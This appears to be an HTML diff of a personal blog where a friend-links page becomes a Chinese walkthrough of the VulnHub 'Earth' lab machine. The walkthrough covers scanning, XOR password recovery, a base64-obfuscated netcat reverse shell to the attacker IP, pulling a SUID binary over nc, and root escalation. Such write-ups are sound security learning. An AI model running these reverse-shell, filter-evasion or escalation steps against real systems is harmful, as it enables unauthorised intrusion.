@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://1t01x1w4.github.io';</script>
   
   <title>
-    友链 |
+    Earth靶机渗透 |
     
     淋着雨
   </title>
@@ -31,30 +31,52 @@
   
   
     
-<link rel="stylesheet" href="../css/loader.css">
+<link rel="stylesheet" href="../../../../css/loader.css">
 
   
   
-    <meta name="description" content="冬鱼🐟                        ctf?坎公骑冠剑！                                                                              栗悟饭与龟波功">
-<meta property="og:type" content="website">
-<meta property="og:title" content="友链">
-<meta property="og:url" content="http://1t01x1w4.github.io/friend/index.html">
+    <meta name="description" content="最近开始学习靶机渗透，目前打了两三个靶机，觉得这个Earth蛮有意思的，写个报告复盘一下。 主机发现本次渗透用kali作为攻击机，Earth作为靶机，网络模式均设置为“NAT”。开启靶机前，在攻击机上执行“ifconfig”查看到攻击机IP为“192.168.222.129&#x2F;24”，接着执行“nmap -sP 192.168.222.129&#x2F;24”扫描同网段的主机；开启靶机后，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Earth靶机渗透">
+<meta property="og:url" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="淋着雨">
-<meta property="og:description" content="冬鱼🐟                        ctf?坎公骑冠剑！                                                                              栗悟饭与龟波功">
+<meta property="og:description" content="最近开始学习靶机渗透，目前打了两三个靶机，觉得这个Earth蛮有意思的，写个报告复盘一下。 主机发现本次渗透用kali作为攻击机，Earth作为靶机，网络模式均设置为“NAT”。开启靶机前，在攻击机上执行“ifconfig”查看到攻击机IP为“192.168.222.129&#x2F;24”，接着执行“nmap -sP 192.168.222.129&#x2F;24”扫描同网段的主机；开启靶机后，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://1t01x1w4.github.io/images/bannner.webp">
-<meta property="article:published_time" content="2026-02-14T08:14:19.358Z">
-<meta property="article:modified_time" content="2026-02-14T08:14:19.358Z">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image1.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image2.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image3.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image4.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image5.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image6.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image7.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image8.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image9.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image10.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image11.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image12.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image13.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image14.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image15.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image16.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image17.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image18.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image19.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image20.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image21.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image22.png">
+<meta property="article:published_time" content="2026-04-30T11:34:54.000Z">
+<meta property="article:modified_time" content="2026-05-02T15:25:29.032Z">
 <meta property="article:author" content="淋着雨">
+<meta property="article:tag" content="Earth">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1t01x1w4.github.io/images/bannner.webp">
+<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image1.png">
   
   
   
-    <link rel="shortcut icon" href="../images/favicon.ico">
+    <link rel="shortcut icon" href="../../../../images/favicon.ico">
   
   
-<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../../../../css/style.css">
 
   <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
   
@@ -140,7 +162,7 @@
               &#xe62b;
              
           </div>
-          <a class="main-nav-link" href="../index.html">主页</a>
+          <a class="main-nav-link" href="../../../../index.html">主页</a>
         </span>
       
         <span class="main-nav-link-wrap">
@@ -149,7 +171,7 @@
               &#xe62b;
              
           </div>
-          <a class="main-nav-link" href="../archives">归档</a>
+          <a class="main-nav-link" href="../../../../archives">归档</a>
         </span>
       
         <span class="main-nav-link-wrap">
@@ -158,7 +180,7 @@
               &#xe62b;
              
           </div>
-          <a class="main-nav-link" href="../friend">友链</a>
+          <a class="main-nav-link" href="../../../../friend">友链</a>
         </span>
       
     
@@ -174,11 +196,13 @@
 <header id="header">
   
     
-      <picture>
-        
-      </picture>
       
-        <img  fetchpriority="high" src="/images/bannner.webp" alt="友链">
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/bannner.webp" alt="Earth靶机渗透">
+        
       
     
   
@@ -188,7 +212,7 @@
         
         
           <span id="logo">
-            <h1 data-aos="slide-up">友链</h1>
+            <h1 data-aos="slide-up">Earth靶机渗透</h1>
           </span>
         
       
@@ -205,7 +229,7 @@
         <div id="content"  class="sidebar-right" >
           <aside id="sidebar">
   
-  <div class="sidebar-wrapper-container ">
+  <div class="sidebar-wrapper-container sticky">
   
     
     
@@ -214,7 +238,15 @@
   <div class="sidebar-wrapper">
     <div class="sidebar-wrap" data-aos="fade-up">
       
-        <div class="sidebar-author">
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E8%8E%B7%E5%8F%96flag"><span class="toc-number">5.</span> <span class="toc-text">getshell获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
@@ -271,8 +303,16 @@
     
   
 </div>
-
+</div>
+        
       
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
       
     </div>
   </div>
@@ -285,18 +325,22 @@
   
 </aside>
 
-          <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-Earth靶机渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-14T08:14:19.358Z" itemprop="datePublished">2026-02-14</time>
-    <time style="display: none;" id="post-update-time">2026-02-14</time>
+    <time datetime="2026-04-30T11:34:54.000Z" itemprop="datePublished">2026-04-30</time>
+    <time style="display: none;" id="post-update-time">2026-05-02</time>
   </span>
   
 </div>
 
       
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/VulnHub/" data-aos="zoom-in">VulnHub</a>
+  </div>
+
 
     </div>
     
@@ -306,37 +350,49 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><div class="friend-wrap" data-aos="zoom-in"><div class="friend-item-wrap">
-    <a href="https://dongyuzzz5.github.io/?t=1770797867124" rel="noopener external nofollow noreferrer" target="_blank"></a>
-    <div class="friend-icon-wrap">
-      <div class="friend-icon">
-          <img data-src="https://dongyuzzz5.github.io/img/avatar_hu_96a5ff7ba96a3e31.png" data-sizes="auto" alt="冬鱼🐟" class="lazyload">
-      </div>
-    </div>
-    <div class="friend-info-wrap">
-      <div class="friend-name">
-          冬鱼🐟 
-      </div>
-      <div class="friend-desc">
-        ctf?坎公骑冠剑！
-      </div>
-    </div>
-  </div><div class="friend-item-wrap">
-    <a href="https://ip2867.github.io/" rel="noopener external nofollow noreferrer" target="_blank"></a>
-    <div class="friend-icon-wrap">
-      <div class="friend-icon">
-          <img data-src="https://ip2867.github.io/avatar/avatar.webp" data-sizes="auto" alt="栗悟饭与龟波功" class="lazyload">
-      </div>
-    </div>
-    <div class="friend-info-wrap">
-      <div class="friend-name">
-          栗悟饭与龟波功 
-      </div>
-      <div class="friend-desc">
-        这一切都是命运石之门的选择！
-      </div>
-    </div>
-  </div></div>
+        <p>最近开始学习靶机渗透，目前打了两三个靶机，觉得这个Earth蛮有意思的，写个报告复盘一下。</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>本次渗透用kali作为攻击机，Earth作为靶机，网络模式均设置为“NAT”。开启靶机前，在攻击机上执行“ifconfig”查看到攻击机IP为“192.168.222.129&#x2F;24”，接着执行“nmap -sP 192.168.222.129&#x2F;24”扫描同网段的主机；开启靶机后，再次扫描同网段主机，对比找到靶机IP为“192.168.222.140”。</p>
+<p><img src="image1.png" alt="查找靶机IP"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>执行“namp -sS 192.168.222.140”扫描靶机开放端口，可以看到有一个ssh连接用的端口和两个网页服务。再执行“nmap -A -p- 192.168.222.140”对端口信息进行详细扫描，这个过程稍微久一点，可以看到443端口下有两个可用域名，分别是“earth.local”和“terratest.earth.local”。</p>
+<p><img src="image2.png" alt="扫描端口"></p>
+<p><img src="image3.png" alt="端口详细信息"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们都知道，访问一个域名时，主机会先在本地的hosts文件下查找有没有匹配的IP地址，如果找到了就直接访问，没找到再通过DNS进行查找。现在我们知道靶机IP，又知道了两个对应IP的域名，那么可以先将IP与域名一一对应关系保存在本地，再去访问域名。通过查找得知Linux系统用于域名解析的文件路径是&#x2F;etc&#x2F;hosts，执行“sudo vim &#x2F;etc&#x2F;hosts”，添加映射信息并保存。</p>
+<p><img src="image4.png" alt="修改&#x2F;etc&#x2F;hosts"></p>
+<p>http协议访问80端口，返回了一个400页面；https协议访问443端口，返回一个fedora网页服务测试页面，均没有得到有效信息。</p>
+<p><img src="image5.png" alt="80端口"></p>
+<p><img src="image6.png" alt="443端口"></p>
+<p>回到收集到的两个域名，刚才我们已经把域名解析映射关系保存在本地了，那么我们便可以在本地直接访问这两个域名。访问earth.local，返回了一个信息服务系统，看样子每次发送信息时需要同时输入信息和密钥，系统会把信息用密钥加密后再发送出去，网页下面还有几条之前发送的信息。</p>
+<p><img src="image7.png" alt="earth.local"></p>
+<p>访问terratest.earth.local，发现和earth.local页面的前端信息是一样的。</p>
+<p><img src="image8.png" alt="terratest.earth.local"></p>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>这两个域名网站除了比开放的两个端口给出了更具体的服务外，也并没有可利用的点。用dirsearch进行目录扫描，进一步搜集信息。http协议下两个域名都扫描出来了登录界面，但我们并没有搜集到可用于登录的信息。</p>
+<p><img src="image9.png" alt="登录界面"></p>
+<p>回想到前面端口扫描时靶机IP下除了有http协议的网页，也有https协议的网页，尝试在https协议下扫描这两个域名，在terratest.earth.local下发现了robots.txt。robots.txt一般是用来说明哪些网页不允许被爬取的，那么这些网页必然有有价值的点。</p>
+<p><img src="image10.png" alt="robots.txt"></p>
+<p>访问“<a target="_blank" rel="noopener" href="https://terratest.earth.local/robots.txt%E2%80%9D%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%80%E4%B8%8B%E9%9D%A2%E6%9C%89%E4%B8%80%E4%B8%AA%E4%B8%8E%E4%BC%97%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AE%83%E7%9A%84%E5%90%8E%E7%BC%80%E8%A2%AB%E9%9A%90%E8%97%8F%E4%BA%86%EF%BC%8C%E6%8E%A8%E6%B5%8B%E6%98%AFphp%E6%88%96%E8%80%85txt%EF%BC%8C%E8%AF%95%E7%9D%80%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%E3%80%82">https://terratest.earth.local/robots.txt”，发现最下面有一个与众不同的文件，它的后缀被隐藏了，推测是php或者txt，试着访问一下。</a></p>
+<p><img src="image11.png" alt="查看robots.txt"></p>
+<p>成功访问到“<a target="_blank" rel="noopener" href="https://terratest.earth.local/testingnotes.txt%E2%80%9D%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E8%AF%B4%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%87%87%E7%94%A8%E5%8F%82%E7%85%A7RSA%E7%9A%84%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%8Ctestdata.txt%E6%96%87%E4%BB%B6%E8%A2%AB%E7%94%A8%E6%9D%A5%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E5%90%8E%E5%8F%B0%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AFterra%E3%80%82">https://terratest.earth.local/testingnotes.txt”，这个文件说信息服务系统采用参照RSA的异或加密算法，testdata.txt文件被用来加密测试，管理员后台用户名是terra。</a></p>
+<p><img src="image12.png" alt="testingnotes.txt"></p>
+<p>访问“<a target="_blank" rel="noopener" href="https://terratest.earth.local/testdata.txt%E2%80%9D%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%98%AF%E4%B8%80%E6%AE%B5%E6%96%87%E5%AD%97%EF%BC%8C%E6%8C%89%E5%B8%B8%E7%90%86%E6%9D%A5%E8%AF%B4%E6%98%8E%E6%96%87%E4%BF%A1%E6%81%AF%E5%BA%94%E8%AF%A5%E4%B8%8D%E4%BC%9A%E8%A2%AB%E8%BF%99%E4%B9%88%E5%AE%B9%E6%98%93%E8%AE%BF%E9%97%AE%E5%88%B0%EF%BC%8C%E6%8E%A8%E6%B5%8B%E8%BF%99%E6%AE%B5%E6%96%87%E5%AD%97%E5%BA%94%E8%AF%A5%E6%98%AF%E4%BD%9C%E4%B8%BA%E5%AF%86%E9%92%A5%E7%94%A8%E7%9A%84%E3%80%82">https://terratest.earth.local/testdata.txt”，可以看到是一段文字，按常理来说明文信息应该不会被这么容易访问到，推测这段文字应该是作为密钥用的。</a></p>
+<p><img src="image13.png" alt="testdata.txt"></p>
+<p>用cyberchef先将加密的内容转为UTF-8格式，接着与密钥异或，得到原文。分别对三段密文做了尝试，前两段密文异或之后均是乱码，第三段密文异或之后发现是“earthclimatechangebad4humans”的循环，由于目前之后登录界面可以作为输入的点，推测应该是登录密码。</p>
+<p><img src="image14.png" alt="解密密文"></p>
+<p>成功用terra用户登录进了系统，可以看到是一个管理员命令工具，用来执行终端命令。经过尝试，虽然说terra是管理员，但这个工具仅仅能够执行一些低权限命令，像查看root文件夹这样子的命令执行后都是返回空。</p>
+<p><img src="image15.png" alt="登录成功"></p>
+<h2 id="getshell获取flag"><a href="#getshell获取flag" class="headerlink" title="getshell获取flag"></a>getshell获取flag</h2><p>在这个命令工具中操作不太方便，考虑反弹shell到kali上。在kali中执行“nc -lvvp 5555”开启一个端口用于接收靶机反弹的shell，接着在命令工具中执行“nc -e &#x2F;bin&#x2F;bash 192.168.222.129 5555”，但是返回提示说远程连接被禁止。</p>
+<p><img src="image16.png" alt="明文反弹bash失败"></p>
+<p>既然明的不行那就只能来暗的了，将命令用base64编码为“bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjIyLjEyOSA1NTU1”，接着拼接为命令“echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjIyLjEyOSA1NTU1 | base64 -d | bash”，通过管道符将命令经过base64解码后再传给bash执行，成功反弹shell。用python脚本“python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’”获得一个可视化交互shell。执行“find -name “<em>flag</em>“”模糊查找文件名包含flag的文件，找到一个.&#x2F;var&#x2F;earth_web&#x2F;user_flag.txt。</p>
+<p><img src="image17.png" alt="user_flag.txt"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行“find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null”在靶机中查找具有SUID标志的文件或命令，在结果中发现一个“reset_root”命令，顾名思义应该是用来重置root用户的。</p>
+<p><img src="image18.png" alt="reset_root"></p>
+<p>执行“reset_root”命令，提示说为检测到触发器，看样子是缺少了什么文件所以没法正常执行。</p>
+<p><img src="image19.png" alt="执行reset_root失败"></p>
+<p>我们都知道，命令其实也是一个程序，既然程序是在运行过程中出问题了，那么可以考虑用strace对运行中的程序进行追踪看看具体是什么情况。在kali中执行“nc -lvvp 1111 &gt; reset_root”用来接收靶机的reset_root内容并重定向到本地的reset_root中，在靶机执行“nc 192.168.222.129 1111 &lt; &#x2F;usr&#x2F;bin&#x2F;reset_root”。</p>
+<p><img src="image20.png" alt="接收文件"></p>
+<p>在kali中执行“strace .&#x2F;reset_root”，跟踪程序进程，发现程序运行时本地缺少了三个必要的文件，靶机中应该也是同样的情况。</p>
+<p><img src="image21.png" alt="缺少三个必要文件"></p>
+<p>在靶机中创建好三个必要文件后，执行reset_root，成功重置root用户密码为Earth。切换到root用户，拿到最终flag。</p>
+<p><img src="image22.png" alt="提权成功"></p>
 
       
     </div>
@@ -350,10 +406,34 @@
       
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/Earth/" rel="tag">Earth</a></li></ul>
+
 
     </footer>
   </div>
   
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/【哲风壁纸】CG插画-CG美女插画.png" data-sizes="auto" alt="ret2syscall" class="lazyload">
+        
+      
+      <a href="/2026/03/13/ret2syscall/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          ret2syscall
+        
+      </h3>
+    </div>
+    
+  </nav>
+
 
 </article>
 
@@ -451,7 +531,15 @@
       <nav id="mobile-nav">
   <div class="sidebar-wrap">
     
-      <div class="sidebar-author">
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E8%8E%B7%E5%8F%96flag"><span class="toc-number">5.</span> <span class="toc-text">getshell获取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
@@ -508,9 +596,17 @@
     
   
 </div>
-
+</div>
+      
     
   </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
   
 </nav>
 
@@ -528,12 +624,12 @@
 
 
 
-<script src="../js/script.js"></script>
+<script src="../../../../js/script.js"></script>
 
 
 
   
-<script src="../js/aos.js"></script>
+<script src="../../../../js/aos.js"></script>
 
   <script>
     var aosInit = () => {
@@ -553,7 +649,7 @@
 
 
 
-<script src="../js/pjax_script.js" data-pjax></script>
+<script src="../../../../js/pjax_script.js" data-pjax></script>
 
 
 
@@ -585,13 +681,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "淋着雨",
-          title: "友链",
-          url: "http://1t01x1w4.github.io/friend/index.html",
+          title: "Earth靶机渗透",
+          url: "http://1t01x1w4.github.io/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/",
           excerpt: "",
           description: "",
-          stripContent: "                                                               冬鱼🐟                        ctf?坎公骑冠剑！                                                                              栗悟饭与龟波功                        这一切都是命运石之门的选择！                ",
-          date: "Sat Feb 14 2026 16:14:19 GMT+0800",
-          updated: "Sat Feb 14 2026 16:14:19 GMT+0800",
+          stripContent: "最近开始学习靶机渗透，目前打了两三个靶机，觉得这个Earth蛮有意思的，写个报告复盘一下。 主机发现本次渗透用kali作为攻击机，Earth作为靶机，网络模式均设置为“NAT”。开启靶机前，在攻击机上执行“ifconfig”查看到攻击机IP为“192.168.222.129&amp;#x2F;24”，接着执行“nmap -sP 192.168.222.129&amp;#x2F;24”扫描同网段的主机；开启靶机后，再次扫描同网段主机，对比找到靶机IP为“192.168.222.140”。  端口扫描执行“namp",
+          date: "Thu Apr 30 2026 19:34:54 GMT+0800",
+          updated: "Sat May 02 2026 23:25:29 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
@@ -600,7 +696,7 @@
     
       
         
-<script src="../js/insert_highlight.js" data-pjax></script>
+<script src="../../../../js/insert_highlight.js" data-pjax></script>
 
         
       
